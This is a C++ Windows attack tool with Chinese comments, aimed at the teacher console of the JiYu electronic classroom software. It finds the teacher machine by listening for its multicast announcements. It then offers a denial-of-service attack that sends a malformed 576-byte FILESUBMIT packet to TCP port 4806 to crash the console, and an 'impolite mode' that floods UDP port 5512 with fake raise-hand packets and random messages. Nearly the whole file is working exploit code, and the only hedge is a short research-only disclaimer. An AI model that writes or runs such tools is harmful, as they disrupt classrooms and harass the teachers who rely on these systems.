#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")

#include <iostream>
#include <cstring>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <atomic>
#include <random>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#define TEACHER_MULTICAST_GROUP "224.50.50.42"
#define TEACHER_PORT            4988
#define TEACHER_CONTROL_PORT    4806
#define BUFFER_SIZE             4096

// Windows控制台颜色类
class ConsoleColor {
private:
    HANDLE hConsole;
    WORD defaultAttributes;

public:
    ConsoleColor() {
        hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
        GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
        defaultAttributes = consoleInfo.wAttributes;
    }

    void setColor(WORD color) {
        SetConsoleTextAttribute(hConsole, color);
    }

    void reset() {
        SetConsoleTextAttribute(hConsole, defaultAttributes);
    }

    // 预定义颜色
    void red() { setColor(FOREGROUND_RED | FOREGROUND_INTENSITY); }
    void green() { setColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void yellow() { setColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void blue() { setColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY); }
    void magenta() { setColor(FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY); }
    void cyan() { setColor(FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY); }
    void white() { setColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY); }
    void gray() { setColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE); }
};

// 全局控制台颜色对象
ConsoleColor console;

// 带颜色的输出函数
void info(const std::string& msg) {
    console.blue();
    std::cout << "[*] " << msg << std::endl;
    console.reset();
}

void success(const std::string& msg) {
    console.green();
    std::cout << "[+] " << msg << std::endl;
    console.reset();
}

void warning(const std::string& msg) {
    console.yellow();
    std::cout << "[!] " << msg << std::endl;
    console.reset();
}

void error(const std::string& msg) {
    console.red();
    std::cout << "[-] " << msg << std::endl;
    console.reset();
}

void important(const std::string& msg) {
    console.magenta();
    std::cout << "[>] " << msg << std::endl;
    console.reset();
}

void printColorText(const std::string& msg, WORD color) {
    console.setColor(color);
    std::cout << msg;
    console.reset();
}

class JiYuAttacker {
private:
    std::string targetIP;
    std::atomic<bool> attacking{ false };
    std::vector<std::thread> attackThreads;
    std::atomic<uint64_t> packetsSent{ 0 };
    std::atomic<uint64_t> bytesSent{ 0 };
    std::atomic<uint64_t> connectFailures{ 0 };
    std::atomic<uint64_t> sendFailures{ 0 };

    // 生成随机字符串
    std::string generateRandomString(int length) {
        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        std::string result;
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

        for (int i = 0; i < length; ++i) {
            result += alphanum[dis(gen)];
        }
        return result;
    }

    // FILESUBMIT协议崩溃攻击线程
    void protocolCrashThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;
        uint64_t localBytes = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                connectFailures++;
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
                continue;
            }

            DWORD timeout = 5000;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

            sockaddr_in teacherAddr;
            teacherAddr.sin_family = AF_INET;
            teacherAddr.sin_port = htons(TEACHER_CONTROL_PORT);
            teacherAddr.sin_addr.s_addr = inet_addr(targetIP.c_str());

            if (connect(sock, (sockaddr*)&teacherAddr, sizeof(teacherAddr)) == SOCKET_ERROR) {
                connectFailures++;
                closesocket(sock);
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }

            // 第一步：发送WORB包
            unsigned char worbPacket[12] = {
                0x00, 0x00, 0x01, 0x00,
                0x57, 0x4f, 0x52, 0x42,
                0x00, 0x00, 0x00, 0x00
            };

            int sent = send(sock, (char*)worbPacket, sizeof(worbPacket), 0);
            if (sent == SOCKET_ERROR) {
                sendFailures++;
            }
            else {
                localPackets++;
                localBytes += sent;
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100));

            // 第二步：发送FILESUBMIT畸形包
            unsigned char crashPacket[576] = { 0 };
            crashPacket[0] = 0x00; crashPacket[1] = 0x00; crashPacket[2] = 0x01; crashPacket[3] = 0x00;
            crashPacket[4] = 0x49; crashPacket[5] = 0x46; crashPacket[6] = 0x50; crashPacket[7] = 0x55;
            crashPacket[8] = 0x34; crashPacket[9] = 0x02; crashPacket[10] = 0x00; crashPacket[11] = 0x00;
            crashPacket[12] = 0x02; crashPacket[13] = 0x00; crashPacket[14] = 0x00; crashPacket[15] = 0x00;
            crashPacket[16] = 0x00; crashPacket[17] = 0x00; crashPacket[18] = 0x00; crashPacket[19] = 0x00;
            crashPacket[20] = 0x00; crashPacket[21] = 0x00; crashPacket[22] = 0x00; crashPacket[23] = 0x00;
            crashPacket[24] = 0x20; crashPacket[25] = 0x00; crashPacket[26] = 0x00; crashPacket[27] = 0x00;
            crashPacket[28] = 0xe7; crashPacket[29] = 0x19; crashPacket[30] = 0xd3; crashPacket[31] = 0xaa;
            crashPacket[32] = 0x19; crashPacket[33] = 0x81; crashPacket[34] = 0xda; crashPacket[35] = 0x01;
            crashPacket[36] = 0x00; crashPacket[37] = 0x00; crashPacket[38] = 0x00; crashPacket[39] = 0x00;
            crashPacket[40] = 0x00; crashPacket[41] = 0x00; crashPacket[42] = 0x00; crashPacket[43] = 0x00;
            crashPacket[44] = 0x46; crashPacket[45] = 0x00; crashPacket[46] = 0x49; crashPacket[47] = 0x00;
            crashPacket[48] = 0x4c; crashPacket[49] = 0x00;
            crashPacket[50] = 0x45; crashPacket[51] = 0x00;
            crashPacket[52] = 0x53; crashPacket[53] = 0x00;
            crashPacket[54] = 0x55; crashPacket[55] = 0x00;
            crashPacket[56] = 0x42; crashPacket[57] = 0x00;
            crashPacket[58] = 0x4d; crashPacket[59] = 0x00;
            crashPacket[60] = 0x49; crashPacket[61] = 0x00;
            crashPacket[62] = 0x54; crashPacket[63] = 0x00;
            crashPacket[64] = 0x7c; crashPacket[65] = 0x00;
            crashPacket[66] = 0x64; crashPacket[67] = 0x00;
            crashPacket[68] = 0x64; crashPacket[69] = 0x00;
            crashPacket[70] = 0x64; crashPacket[71] = 0x00;
            crashPacket[72] = 0x64; crashPacket[73] = 0x00;
            crashPacket[74] = 0x64; crashPacket[75] = 0x00;
            crashPacket[76] = 0x64; crashPacket[77] = 0x00;
            crashPacket[78] = 0x64; crashPacket[79] = 0x00;
            crashPacket[80] = 0x64; crashPacket[81] = 0x00;
            crashPacket[82] = 0x64; crashPacket[83] = 0x00;
            crashPacket[84] = 0x64; crashPacket[85] = 0x00;
            crashPacket[86] = 0x64; crashPacket[87] = 0x00;
            crashPacket[88] = 0x64; crashPacket[89] = 0x00;
            crashPacket[90] = 0x64; crashPacket[91] = 0x00;
            crashPacket[92] = 0x64; crashPacket[93] = 0x00;
            crashPacket[94] = 0x64; crashPacket[95] = 0x00;
            crashPacket[96] = 0x7c; crashPacket[97] = 0x00;

            for (int i = 98; i < 576; i++) {
                crashPacket[i] = 0x66;
            }

            sent = send(sock, (char*)crashPacket, sizeof(crashPacket), 0);
            if (sent == SOCKET_ERROR) {
                sendFailures++;
            }
            else {
                localPackets++;
                localBytes += sent;

                // 每5次攻击显示一次进度
                if (localPackets % 5 == 0) {
                    info("FILESUBMIT攻击正在进行中 已完成" + std::to_string(localPackets) + "次攻击");
                }
            }

            std::this_thread::sleep_for(std::chrono::seconds(2));
            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }

        packetsSent += localPackets;
        bytesSent += localBytes;
        WSACleanup();
    }

    // 不客气模式 - 持续发送举手包和消息包
    void impoliteModeThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        SOCKET udpSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (udpSock == INVALID_SOCKET) {
            WSACleanup();
            return;
        }

        int reuse = 1;
        setsockopt(udpSock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

        sockaddr_in teacherAddr;
        teacherAddr.sin_family = AF_INET;
        teacherAddr.sin_port = htons(5512);
        teacherAddr.sin_addr.s_addr = inet_addr(targetIP.c_str());

        // 举手包数据
        // 注意：消息体与其它消息使用的偏移为 80 字节（messageOffset = 80），
        // 因此举手包也应该为 80 字节并在末尾填充 0x00。
        unsigned char raiseHandPacket[80] = {
            0x00, 0x00, 0x01, 0x00, 0x49, 0x46, 0x50, 0x55,
            0x34, 0x02, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x20, 0x00, 0x00, 0x00, 0xe7, 0x19, 0xd3, 0xaa,
            0x19, 0x81, 0xda, 0x01, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x52, 0x00, 0x41, 0x00,
            0x49, 0x00, 0x53, 0x00, 0x45, 0x00, 0x48, 0x00,
            0x41, 0x00, 0x4e, 0x00, 0x44, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        // 消息包基础结构
        unsigned char baseMessagePacket[971] = { 0 };
        baseMessagePacket[0] = 0x00; baseMessagePacket[1] = 0x00; baseMessagePacket[2] = 0x01; baseMessagePacket[3] = 0x00;
        baseMessagePacket[4] = 0x49; baseMessagePacket[5] = 0x46; baseMessagePacket[6] = 0x50; baseMessagePacket[7] = 0x55;
        baseMessagePacket[8] = 0x34; baseMessagePacket[9] = 0x02; baseMessagePacket[10] = 0x00; baseMessagePacket[11] = 0x00;
        baseMessagePacket[12] = 0x02; baseMessagePacket[13] = 0x00; baseMessagePacket[14] = 0x00; baseMessagePacket[15] = 0x00;

        baseMessagePacket[44] = 0x54; baseMessagePacket[45] = 0x00;
        baseMessagePacket[46] = 0x45; baseMessagePacket[47] = 0x00;
        baseMessagePacket[48] = 0x58; baseMessagePacket[49] = 0x00;
        baseMessagePacket[50] = 0x54; baseMessagePacket[51] = 0x00;
        baseMessagePacket[52] = 0x53; baseMessagePacket[53] = 0x00;
        baseMessagePacket[54] = 0x55; baseMessagePacket[55] = 0x00;
        baseMessagePacket[56] = 0x42; baseMessagePacket[57] = 0x00;
        baseMessagePacket[58] = 0x4d; baseMessagePacket[59] = 0x00;
        baseMessagePacket[60] = 0x49; baseMessagePacket[61] = 0x00;
        baseMessagePacket[62] = 0x54; baseMessagePacket[63] = 0x00;

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;
        uint64_t localBytes = 0;
        int packetCounter = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            // 交替发送举手包和消息包
            if (packetCounter % 2 == 0) {
                // 发送举手包
                int sent = sendto(udpSock, (char*)raiseHandPacket, sizeof(raiseHandPacket), 0,
                    (sockaddr*)&teacherAddr, sizeof(teacherAddr));

                if (sent > 0) {
                    localPackets++;
                    localBytes += sent;
                }
            }
            else {
                // 发送随机消息包
                std::string randomMessage = generateRandomString(10 + (packetCounter % 50));

                // 构建消息包
                std::vector<unsigned char> messagePacket(baseMessagePacket, baseMessagePacket + sizeof(baseMessagePacket));

                // 在适当位置插入随机消息
                int messageOffset = 80;
                for (size_t i = 0; i < randomMessage.length() && (i + messageOffset) < messagePacket.size(); i++) {
                    messagePacket[i + messageOffset] = randomMessage[i];
                }

                int sent = sendto(udpSock, (char*)messagePacket.data(), messagePacket.size(), 0,
                    (sockaddr*)&teacherAddr, sizeof(teacherAddr));

                if (sent > 0) {
                    localPackets++;
                    localBytes += sent;
                }
            }

            packetCounter++;

            // 每10个包显示一次进度
            if (packetCounter % 10 == 0) {
                info("不客气模式正在进行中 已发送" + std::to_string(localPackets) + "个包");
            }

            // 随机延迟 500-2000ms
            std::this_thread::sleep_for(std::chrono::milliseconds(500 + (packetCounter % 1500)));
        }

        packetsSent += localPackets;
        bytesSent += localBytes;
        closesocket(udpSock);
        WSACleanup();
    }

public:
    JiYuAttacker(const std::string& ip) : targetIP(ip) {}
    ~JiYuAttacker() { stopAttack(); }

    void startAttack(int attackType, int threads, int durationSeconds) {
        if (attacking) {
            warning("攻击已在进行中！");
            return;
        }

        attacking = true;
        packetsSent = 0;
        bytesSent = 0;
        connectFailures = 0;
        sendFailures = 0;

        const char* attackName =
            (attackType == 1 ? "FILESUBMIT协议崩溃攻击" :
                attackType == 2 ? "不客气模式(持续骚扰)" : "未知攻击");

        const char* desc =
            (attackType == 1 ? "基于抓包Frame 17的576字节FILESUBMIT畸形包" :
                attackType == 2 ? "持续发送举手包和随机消息包骚扰教师机" : "");

        success("启动攻击: " + std::string(attackName));
        if (strlen(desc) > 0) info(desc);
        info("目标IP: " + targetIP);
        info("线程数: " + std::to_string(threads));
        info("持续时间: " + std::to_string(durationSeconds) + "秒");
        warning("攻击进行中...");

        if (attackType == 2) {
            // 不客气模式 - 持续骚扰
            for (int i = 0; i < threads; i++) {
                attackThreads.emplace_back(&JiYuAttacker::impoliteModeThread, this, i, durationSeconds);
            }
        }
        else if (attackType == 1) {
            // FILESUBMIT协议崩溃攻击
            for (int i = 0; i < threads; i++) {
                attackThreads.emplace_back(&JiYuAttacker::protocolCrashThread, this, i, durationSeconds);
            }
        }

        // 详细统计线程
        std::thread statsThread([this, durationSeconds, attackType]() {
            auto start = std::chrono::steady_clock::now();
            while (attacking) {
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - start).count();
                if (elapsed >= durationSeconds) break;

                if (attackType == 2) {
                    // 不客气模式专用统计
                    console.cyan();
                    std::cout << "\r[*] 不客气模式 已发送: " << packetsSent << " 包, "
                        << bytesSent << " 字节 | 时间: " << elapsed << "/" << durationSeconds << "秒";
                    console.reset();
                    std::cout << std::flush;
                }
                else {
                    // FILESUBMIT模式统计
                    console.cyan();
                    std::cout << "\r[*] FILESUBMIT攻击 发送: " << packetsSent << " 包, "
                        << bytesSent << " 字节 | 时间: " << elapsed << "/" << durationSeconds << "秒";
                    console.reset();
                    std::cout << std::flush;
                }
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
            });
        statsThread.detach();

        // 等待完成
        std::thread waitThread([this, durationSeconds]() {
            auto start = std::chrono::steady_clock::now();
            while (attacking) {
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - start).count();
                if (elapsed >= durationSeconds) {
                    attacking = false;
                    break;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            });

        waitThread.join();
        stopAttack();
    }

    void stopAttack() {
        if (!attacking && attackThreads.empty()) return;

        warning("正在停止攻击...");
        attacking = false;

        for (auto& t : attackThreads) {
            if (t.joinable()) t.join();
        }
        attackThreads.clear();

        success("攻击已停止");
        info("总计: " + std::to_string(packetsSent) + " 包, " + std::to_string(bytesSent) + " 字节");
        if (connectFailures > 0 || sendFailures > 0) {
            warning("失败统计: 连接失败" + std::to_string(connectFailures) +
                "次, 发送失败" + std::to_string(sendFailures) + "次");
        }
    }

    void showMenu() {
        console.magenta();
        std::cout << "\n========== 极域电子教室测试工具 ==========" << std::endl;
        console.reset();

        console.cyan();
        std::cout << "目标教师机: " << targetIP << std::endl;
        console.reset();

        console.magenta();
        std::cout << "=========================================" << std::endl;
        console.reset();

        console.white();
        std::cout << "[1] FILESUBMIT协议崩溃攻击" << std::endl;
        std::cout << "[2] 不客气模式 (持续骚扰)" << std::endl;
        std::cout << "[3] 重新发现教师机" << std::endl;
        std::cout << "[0] 退出程序" << std::endl;
        console.reset();

        console.magenta();
        std::cout << "=========================================" << std::endl;
        console.reset();

        console.cyan();
        std::cout << "请选择: ";
        console.reset();
    }
};

class JiYuStudentClient {
private:
    SOCKET multicastSock;
    std::string teacherIP;

    void listLocalIPs() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        hostent* host = gethostbyname(hostname);

        info("本机网卡IP地址列表：");
        for (int i = 0; host->h_addr_list[i] != nullptr; i++) {
            in_addr addr;
            memcpy(&addr, host->h_addr_list[i], sizeof(in_addr));
            console.white();
            std::cout << "  - " << inet_ntoa(addr) << std::endl;
            console.reset();
        }
    }

    std::string parseCANCFromPacket(const char* buffer, int length) {
        if (length < 112) return "";

        if (length >= 0x24) {
            unsigned char ipBytes[4];
            ipBytes[0] = buffer[0x20];
            ipBytes[1] = buffer[0x21];
            ipBytes[2] = buffer[0x22];
            ipBytes[3] = buffer[0x23];

            char ipStr[16];
            sprintf(ipStr, "%d.%d.%d.%d", ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3]);
            return std::string(ipStr);
        }
        return "";
    }

public:
    JiYuStudentClient() {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        multicastSock = INVALID_SOCKET;
    }

    ~JiYuStudentClient() {
        if (multicastSock != INVALID_SOCKET) closesocket(multicastSock);
        WSACleanup();
    }

    std::string discoverTeacherIP(int timeoutSeconds = 10) {
        console.magenta();
        std::cout << "=== 极域电子教室教师机发现工具 ===" << std::endl;
        console.reset();

        console.cyan();
        std::cout << "By: Lxrui & KimiAI & DeepSeek" << std::endl << std::endl;
        console.reset();

        listLocalIPs();

        info("正在监听组播地址 " + std::string(TEACHER_MULTICAST_GROUP) +
            " 端口 " + std::to_string(TEACHER_PORT) + " ...");
        info("超时时间: " + std::to_string(timeoutSeconds) + " 秒");

        multicastSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (multicastSock == INVALID_SOCKET) {
            error("创建套接字失败，错误码：" + std::to_string(WSAGetLastError()));
            return "";
        }

        int reuse = 1;
        if (setsockopt(multicastSock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse)) == SOCKET_ERROR) {
            warning("设置SO_REUSEADDR失败，错误码：" + std::to_string(WSAGetLastError()));
        }

        sockaddr_in localAddr;
        memset(&localAddr, 0, sizeof(localAddr));
        localAddr.sin_family = AF_INET;
        localAddr.sin_addr.s_addr = INADDR_ANY;
        localAddr.sin_port = htons(TEACHER_PORT);

        if (bind(multicastSock, (sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
            error("绑定端口失败，错误码：" + std::to_string(WSAGetLastError()));
            closesocket(multicastSock);
            return "";
        }

        ip_mreq mreq;
        mreq.imr_multiaddr.s_addr = inet_addr(TEACHER_MULTICAST_GROUP);
        mreq.imr_interface.s_addr = INADDR_ANY;

        if (setsockopt(multicastSock, IPPROTO_IP, IP_ADD_MEMBERSHIP,
            (char*)&mreq, sizeof(mreq)) == SOCKET_ERROR) {
            warning("加入组播组失败（可能需要管理员权限），错误码：" + std::to_string(WSAGetLastError()));
        }

        DWORD timeout = timeoutSeconds * 1000;
        setsockopt(multicastSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        char buffer[BUFFER_SIZE];
        int packetCount = 0;

        info("等待教师机广播消息...");

        auto startTime = std::chrono::steady_clock::now();

        while (true) {
            sockaddr_in fromAddr;
            int fromLen = sizeof(fromAddr);
            int recvLen = recvfrom(multicastSock, buffer, BUFFER_SIZE - 1, 0,
                (sockaddr*)&fromAddr, &fromLen);

            auto currentTime = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime).count();
            if (elapsed >= timeoutSeconds) {
                error("搜索超时，未在 " + std::to_string(timeoutSeconds) + " 秒内发现教师机");
                break;
            }

            if (recvLen > 0) {
                packetCount++;
                console.cyan();
                std::cout << "\r[*] 收到数据包 " << packetCount << " (长度: " << recvLen << " 字节)";
                console.reset();
                std::cout << std::flush;

                if (recvLen >= 4) {
                    std::string packetType(buffer, 4);

                    if (packetType == "OONC" && recvLen >= 44) {
                        teacherIP = inet_ntoa(fromAddr.sin_addr);

                        std::cout << std::endl << std::endl;
                        success("发现教师机 (OONC包)!");
                        console.magenta();
                        std::cout << "====================================" << std::endl;
                        console.reset();
                        console.cyan();
                        std::cout << "教师机IP地址: " << teacherIP << std::endl;
                        std::cout << "通信端口: " << ntohs(fromAddr.sin_port) << std::endl;
                        std::cout << "数据包大小: " << recvLen << " 字节" << std::endl;
                        std::cout << "包类型: OONC" << std::endl;
                        console.reset();
                        console.magenta();
                        std::cout << "====================================" << std::endl;
                        console.reset();

                        closesocket(multicastSock);
                        return teacherIP;
                    }
                    else if (packetType == "CANC" && recvLen >= 112) {
                        teacherIP = parseCANCFromPacket(buffer, recvLen);
                        if (!teacherIP.empty()) {
                            std::cout << std::endl << std::endl;
                            success("发现教师机 (CANC包)!");
                            console.magenta();
                            std::cout << "====================================" << std::endl;
                            console.reset();
                            console.cyan();
                            std::cout << "教师机IP地址: " << teacherIP << std::endl;
                            std::cout << "通信端口: " << ntohs(fromAddr.sin_port) << std::endl;
                            std::cout << "数据包大小: " << recvLen << " 字节" << std::endl;
                            std::cout << "包类型: CANC" << std::endl;
                            console.reset();
                            console.magenta();
                            std::cout << "====================================" << std::endl;
                            console.reset();

                            closesocket(multicastSock);
                            return teacherIP;
                        }
                    }
                    else {
                        console.cyan();
                        std::cout << "\r[*] 未知包类型: " << packetType << " (长度: " << recvLen << ")";
                        console.reset();
                        std::cout << std::flush;
                    }
                }
            }
            else if (recvLen == 0) {
                break;
            }
        }

        closesocket(multicastSock);
        error("搜索失败，未发现教师机");
        return "";
    }
};

void showWarning() {
    console.yellow();
    std::cout << "=====================================================================" << std::endl;
    console.reset();

    console.red();
    std::cout << "警告：本程序仅供网络安全研究和教育用途！" << std::endl;
    console.reset();

    console.yellow();
    std::cout << "请务必在授权环境下测试，非法使用可能违反法律！" << std::endl;
    std::cout << "=====================================================================" << std::endl;
    console.reset();

    console.cyan();
    std::cout << "\n按回车键继续..." << std::endl;
    console.reset();
    std::cin.get();
}

int main() {
    showWarning();

    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(elevation);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (!isAdmin) {
        warning("未以管理员权限运行，某些功能可能受限！");
        warning("建议右键以管理员身份运行此程序");
        console.cyan();
        std::cout << "\n按回车键继续..." << std::endl;
        console.reset();
        std::cin.get();
    }

    std::string teacherIP;
    JiYuStudentClient* client = nullptr;
    JiYuAttacker* attacker = nullptr;

    while (true) {
        if (client == nullptr) {
            client = new JiYuStudentClient();
            teacherIP = client->discoverTeacherIP(10);
            delete client;
            client = nullptr;
        }

        if (!teacherIP.empty() && attacker == nullptr) {
            attacker = new JiYuAttacker(teacherIP);
        }

        if (attacker != nullptr) {
            attacker->showMenu();

            int choice;
            std::cin >> choice;
            std::cin.ignore();

            switch (choice) {
            case 1:
            case 2: {
                console.cyan();
                std::cout << "\n[*] 攻击配置:" << std::endl;
                console.reset();
                console.white();
                std::cout << "线程数(建议10-100): ";
                console.reset();
                int threads;
                std::cin >> threads;
                console.white();
                std::cout << "持续时间(秒): ";
                console.reset();
                int duration;
                std::cin >> duration;
                std::cin.ignore();

                attacker->startAttack(choice, threads, duration);
                break;
            }
            case 3: {
                delete attacker;
                attacker = nullptr;
                info("重新发现教师机...");
                break;
            }
            case 0: {
                delete attacker;
                info("程序已退出");
                return 0;
            }
            default: {
                error("无效选项！");
                break;
            }
            }
        }
        else {
            console.red();
            std::cout << "\n[-] 未发现教师机，重试？(y/n): ";
            console.reset();
            char retry;
            std::cin >> retry;
            std::cin.ignore();
            if (retry != 'y' && retry != 'Y') {
                break;
            }
        }
    }

    if (attacker) delete attacker;
    info("程序已退出");
    return 0;
}